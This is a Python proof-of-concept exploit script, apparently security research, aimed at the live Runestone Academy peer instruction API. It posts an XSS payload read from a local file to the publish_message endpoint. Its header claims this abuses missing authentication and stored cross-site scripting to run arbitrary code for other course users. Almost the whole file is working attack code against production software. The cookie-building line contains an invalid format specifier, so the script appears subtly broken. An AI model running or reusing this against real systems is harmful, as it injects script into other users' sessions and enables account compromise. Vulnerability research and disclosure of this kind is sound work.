# Security Research PoC
#
# Written by Kameron Barnes on September 21, 2026
# This file demonstrates an XSS vulnerability within the Runestone
# peer instruction section utilizing CWE-306 and CWE-79.

import argparse
import requests
import json

parser = argparse.ArgumentParser(
    description="Proof-of-concept code that exploits CWE-306 and CWE-79 to run\
    arbitrary code on Runestone peer instruction"
)

parser.add_argument(
    "access_token", help="The token used by Runestone to authenticate a user", type=str
)

parser.add_argument("course_name", help="Target course", type=str)

parser.add_argument(
    "div_id", help="The name of the peer instruction assignment", type=str
)

args = parser.parse_args()
url = "https://runestone.academy/"
endpoint = url + "assignment/peer/api/publish_message"
with open("payload.html", "r") as file:
    payload = file.read().replace("\n", "")

data = {
    "type": "control",
    "course_name": args.course_name,
    "div_id": args.div_id,
    "message": "enableChat",
    "answer": json.dumps({"POC": payload}),
}

headers = {
    "User-Agent": (
        "Mozilla/5.0 (X11; Linux x86_64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/152.0.0.0 Safari/537.36"
    ),
    "Cookie": f"access_token={args.access_token: str}",
}

# Send our payload
r = requests.post(endpoint, headers=headers, json=data)
if r.status_code == 200:
    print("Success")
else:
    print("Failed")
